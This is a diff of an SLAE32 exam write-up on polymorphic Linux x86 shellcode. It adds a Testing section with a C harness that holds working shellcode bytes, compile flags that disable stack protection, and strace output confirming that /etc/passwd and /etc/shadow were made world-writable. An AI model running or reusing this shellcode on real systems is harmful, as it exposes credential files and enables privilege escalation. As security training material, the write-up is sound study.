@@ -48,6 +48,7 @@ The files for this part of the assignment are the following:
 - [original_shellcode.nasm](https://github.com/rbctee/SlaeExam/blob/main/slae32/assignment/6/part/1/original_shellcode.nasm), contains the original shellcode of which I wrote a polymorphic version
 - [polymorphic_stable.nasm](https://github.com/rbctee/SlaeExam/blob/main/slae32/assignment/6/part/1/polymorphic_stable.nasm), contains the polymorphic version of the shellcode, but with a few more checks in order to avoid segmentation faults
 - [polymorphic_tiny.nasm](https://github.com/rbctee/SlaeExam/blob/main/slae32/assignment/6/part/1/polymorphic_tiny.nasm)
+- [test_polymorphic_stable.c](https://github.com/rbctee/SlaeExam/blob/main/slae32/assignment/6/part/1/test_polymorphic_stable.c), a C program for testing the polymorphic shellcode (`polymorphic_stable.nasm`)
 
 ## Definitions
 
@@ -161,9 +162,9 @@ int main(int argc, char *argv[])
 
 It changes the permissions on the files `/etc/passwd` and `/etc/shadow` to `0666`. After that, it uses the `exit` syscall to terminate its own execution.
 
-### Polymorphic version
+## Polymorphic version
 
-#### Focus on size
+### Focus on size
 
 Follows the smallest version I managed to write:
 
@@ -255,7 +256,7 @@ Although, I managed to make it smaller, it requires one **condition**:
 
 If the register `EAX` isn't set to 0, then the next call will throw a `SIGSEGV` signal, so the program will crash.
 
-#### Focus on stability
+### Focus on stability
 
 For this reason, I also wrote a slightly different version that handles this case, not the SIGSEGV error but clearing the EAX register:
 
@@ -290,3 +291,41 @@ mov eax, edx
 ```
 
 Although not very small, at `56` bytes, this stable polymorphic version is still smaller than the original shellcode. 
+
+### Testing
+
+To test the polymorphic shellcode, I've used the following C program:
+
+```cpp
+#include <stdio.h>
+#include <string.h>
+
+unsigned char code[] = \
+"\x31\xc9\xf7\xe1\xbe\x2f\x65\x74\x63\x50\x68\x61\x64\x6f\x77\x68\x2f\x2f\x73\x68\x56\x89\xe3\x04\x0f\x66\xb9\xb6\x01\xcd\x80\x89\xd0\x50\x68\x73\x73\x77\x64\x04\x0f\x68\x2f\x2f\x70\x61\x56\x54\x5b\xcd\x80\x89\xd0\x40\xcd\x80";
+
+main() {
+    printf("Shellcode length: %d\n", strlen(code));
+
+    int (*ret)() = (int(*)())code;
+    ret();
+}
+```
+
+To compile:
+
+```bash
+gcc -fno-stack-protector -z execstack -o test_polymorphic_shellcode test_polymorphic_shellcode.c
+```
+
+Once I've run it, I could confirm it executes changes the permissions over `/etc/passwd` and `/etc/shadow` successfully:
+
+```bash
+rbct@slae:~/exam/assignment_6/1$ sudo strace -e trace=chmod ./test_polymorphic_shellcode 
+# Shellcode length: 56
+# chmod("/etc//shadow", 0666)             = 0
+# chmod("/etc//passwd", 0666)             = 0
+
+rbct@slae:~/exam/assignment_6/1$
+```
+
+As you can see, `chmod` returned the value `0` in both cases, which means it managed to change the permissions and exit gracefully.
